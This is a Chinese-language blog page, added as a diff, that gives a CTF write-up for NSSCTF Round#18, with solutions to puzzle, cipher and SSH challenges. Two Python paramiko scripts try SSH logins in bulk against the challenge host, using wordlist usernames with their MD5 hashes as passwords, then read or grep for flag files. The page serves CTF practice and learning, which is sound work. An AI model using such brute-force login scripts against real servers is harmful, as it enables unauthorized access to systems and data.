@@ -1,0 +1,139 @@
+<!DOCTYPE html><html lang="zh-cn" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NSSCTF-Round#18-WP | CTFrookie</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.woff2"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><meta name="page-config" content="{&quot;code_fold&quot;:null}"><script class="pjax-js">var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}};
+var page_config = {
+  code_fold: null
+};
+function updatePageConfig() {
+  var newPageConfig = document.querySelector('meta[name="page-config"]');
+  if (newPageConfig) {
+    page_config = JSON.parse(newPageConfig.content);
+  }
+}
+document.addEventListener('pjax:complete', function() { updatePageConfig(); });
+updatePageConfig();</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('/img/bg.jpg');
+ --light-background: url('https://api.tanmantang.com/api/mc');
+ --theme-encrypt-confirm: '确认'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+  menuSettings: {
+    zoom: "None"
+  },
+  showMathMenu: false,
+  jax: ["input/TeX","output/CommonHTML"],
+  extensions: ["tex2jax.js"],
+  TeX: {
+    extensions: ["AMSmath.js","AMSsymbols.js"],
+    equationNumbers: {
+      autoNumber: "AMS"
+    }
+  },
+  tex2jax: {
+    inlineMath: [["\\(", "\\)"]],
+    displayMath: [["\\[", "\\]"]]
+  }
+});
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {MathJax.Hub.Queue(["Typeset", MathJax.Hub]);document.querySelector('.lg-container')?.remove()
+const postBg = document.querySelector('#post-bg');
+if (postBg) lightGallery(postBg, {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/Links/"><span class="navItemTitle">Links</span></a></li><li class="navItem"><a class="navBlock" href="/CTFEvents/"><span class="navItemTitle">CTFEvents</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/tools/"><span class="navItemTitle">Tools</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>NSSCTF-Round#18-WP</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-02-14T21:49:18.000Z" id="date"> 2024-02-14</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2025-11-19T05:25:29.582Z" id="updated"> 2025-11-19</time></div></span></div></div><hr><div id="post-content"><h2 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h2><h3 id="温馨的酒吧"><a href="#温馨的酒吧" class="headerlink" title="温馨的酒吧"></a>温馨的酒吧</h3><p>1.可以一个一个试</p>
+<p>2.使用<a target="_blank" rel="noopener" href="https://github.com/JimmyLiang-lzm/biliDownloader">bilibili弹幕网视频下载器😀</a>下载所有分支去查看</p>
+<p>[NSSRound#18]温馨的酒吧\A_看看菜单\B_1SelectFrom_Flag</p>
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214213951408.png'><img src="/NSSCTFRound18WP.assets/image-20240214213951408.png" alt="image-20240214213951408"></p>
+<p>[NSSRound#18]温馨的酒吧\C_沉默\B_好啊~\B_太菜了，打不动！！\A_\D_Web\C_放下比赛，安慰对象。</p>
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214214042769.png'><img src="/NSSCTFRound18WP.assets/image-20240214214042769.png" alt="image-20240214214042769"></p>
+<p>[NSSRound#18]温馨的酒吧\B_谢队！我要向你发起决斗！\D_突然不想打了，快跑！\A_</p>
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214214132305.png'><img src="/NSSCTFRound18WP.assets/image-20240214214132305.png" alt="image-20240214214132305"></p>
+<p>FLAG：NSSCTF{新年快乐_不要停下来啊_CTFer}</p>
+<h3 id="usersssssssss"><a href="#usersssssssss" class="headerlink" title="usersssssssss"></a>usersssssssss</h3><p>看到docker的文件了(可以根据文件名称登录相应用户查看)</p>
+<p>直接python脚本爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置登录信息</span></span><br><span class="line">hostname = <span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28905</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取字典文件并提取用户名和密码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        username = line.strip()</span><br><span class="line">        password = hashlib.md5(username.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 建立SSH连接</span></span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh.connect(hostname, port, username, password)</span><br><span class="line">            <span class="comment"># 执行ls命令并保存结果到文件</span></span><br><span class="line">            stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cat /home/laminous/flag.txt&#x27;</span>)</span><br><span class="line">            result = stdout.readlines()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ssh_results.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> output_file:  <span class="comment"># 使用&#x27;a&#x27;模式以追加方式打开文件</span></span><br><span class="line">                output_file.write(<span class="string">f&quot;成功登录用户：<span class="subst">&#123;username&#125;</span>\n&quot;</span>)</span><br><span class="line">                output_file.write(<span class="string">&quot;命令执行结果：\n&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">                    output_file.write(item.strip() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> paramiko.AuthenticationException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;登录失败，用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        ssh.close()</span><br></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214213557123.png'><img src="/NSSCTFRound18WP.assets/image-20240214213557123.png" alt="image-20240214213557123"></p>
+<p>FLAG：NSSCTF{0077824f-6eac-40ee-8cf0-47019da3d925}</p>
+<h3 id="usersssssssss-revenge"><a href="#usersssssssss-revenge" class="headerlink" title="usersssssssss_revenge"></a>usersssssssss_revenge</h3><p>直接脚本爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置登录信息</span></span><br><span class="line">hostname = <span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28499</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取字典文件并提取用户名和密码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        username = line.strip()</span><br><span class="line">        password = hashlib.md5(username.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 建立SSH连接</span></span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh.connect(hostname, port, username, password)</span><br><span class="line">            <span class="comment"># 执行ls命令并保存结果到文件</span></span><br><span class="line">            stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;grep -r --include=*.txt &quot;NSSCTF&quot; /&#x27;</span>)</span><br><span class="line">            result = stdout.readlines()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ssh_results.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> output_file:  <span class="comment"># 使用&#x27;a&#x27;模式以追加方式打开文件</span></span><br><span class="line">                output_file.write(<span class="string">f&quot;成功登录用户：<span class="subst">&#123;username&#125;</span>\n&quot;</span>)</span><br><span class="line">                output_file.write(<span class="string">&quot;命令执行结果：\n&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">                    output_file.write(item.strip() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> paramiko.AuthenticationException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;登录失败，用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214213628142.png'><img src="/NSSCTFRound18WP.assets/image-20240214213628142.png" alt="image-20240214213628142"></p>
+<p>FLAG：NSSCTF{51b40507-a867-4f07-b798-3b0fff186a33}</p>
+<h3 id="Number-7（赛后难绷）"><a href="#Number-7（赛后难绷）" class="headerlink" title="Number 7（赛后难绷）"></a>Number 7（赛后难绷）</h3><p>题目:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Inside No.9 or Inside No.7 ?</span><br><span class="line">182A1918071C152E0A4737263A3E780A6F6A075A112742777C687D0700773F7D39560063487D</span><br></pre></td></tr></table></figure>
+
+<p>随波逐流5.2直出</p>
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214213347052.png'><img src="/NSSCTFRound18WP.assets/image-20240214213347052.png" alt="image-20240214213347052"></p>
+<p>FLAG：NSSCTF{H4PPY_N3WY34r_4ND_N55CTF_18TH}</p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO:"></a>CRYPTO:</h2><h3 id="过年来下棋"><a href="#过年来下棋" class="headerlink" title="过年来下棋"></a>过年来下棋</h3><p>推测是棋盘密码,根据题目lucky试了一下就出来了</p>
+<p>新年快乐呀！来一起下象棋吧！我都摆好咯~ 祝愿大家在新的一年里 lucky！flag格式：NSSCTF{<strong>字母小写</strong>}</p>
+<p class='item-img' data-src='/NSSCTFRound18WP.assets/image-20240214133345719.png'><img src="/NSSCTFRound18WP.assets/image-20240214133345719.png" alt="image-20240214133345719"></p>
+<p>FLAG：NSSCTF{h499yn3wye4r}</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/02/19/SICTF-Round3-WP/">← 下一篇 SICTF-Round3#WP</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/06/BeginCTF2024%20WP/">BeginCTF2024 WP 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/Liu.png" alt="Logo" style="margin:undefined;border-radius:undefined;"></a><h1 id="Dr"><a href="/">Liu</a></h1><div id="description"><p>你好，我是Liu，一个热爱学习和探索的人。</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">MISC：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%A9%E9%A6%A8%E7%9A%84%E9%85%92%E5%90%A7"><span class="toc-number">1.1.</span> <span class="toc-text">温馨的酒吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#usersssssssss"><span class="toc-number">1.2.</span> <span class="toc-text">usersssssssss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#usersssssssss-revenge"><span class="toc-number">1.3.</span> <span class="toc-text">usersssssssss_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Number-7%EF%BC%88%E8%B5%9B%E5%90%8E%E9%9A%BE%E7%BB%B7%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">Number 7（赛后难绷）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E5%B9%B4%E6%9D%A5%E4%B8%8B%E6%A3%8B"><span class="toc-number">2.1.</span> <span class="toc-text">过年来下棋</span></a></li></ol></li></ol></div></div><footer><nobr><span class="icp-title">ICP</span><a class="icp-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2023022708号-1</a></nobr><br><nobr><span class="icp-title">©</span><span class="icp-content">2023-2024</span></nobr><br><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script defer src="&lt;script charset=&quot;UTF-8&quot; id=&quot;LA_COLLECT&quot; src=&quot;//sdk.51.la/js-sdk-pro.min.js&quot;&gt;&lt;/script&gt;"></script><script defer src="&lt;script&gt;LA.init({id:&quot;3HQbQtTptnnrcizP&quot;,ck:&quot;3HQbQtTptnnrcizP&quot;,autoTrack:true})&lt;/script&gt;"></script><script defer src="&lt;script type=&quot;text/javascript&quot;&gt;(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src=&quot;https://www.clarity.ms/tag/&quot;+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;opl82iwvrr&quot;);&lt;/script&gt;"></script><script defer src="&lt;script type=&quot;text/javascript&quot;&gt; (function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src=&quot;https://www.clarity.ms/tag/&quot;+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;oplkns4lor&quot;);&lt;/script&gt;"></script></body></html>
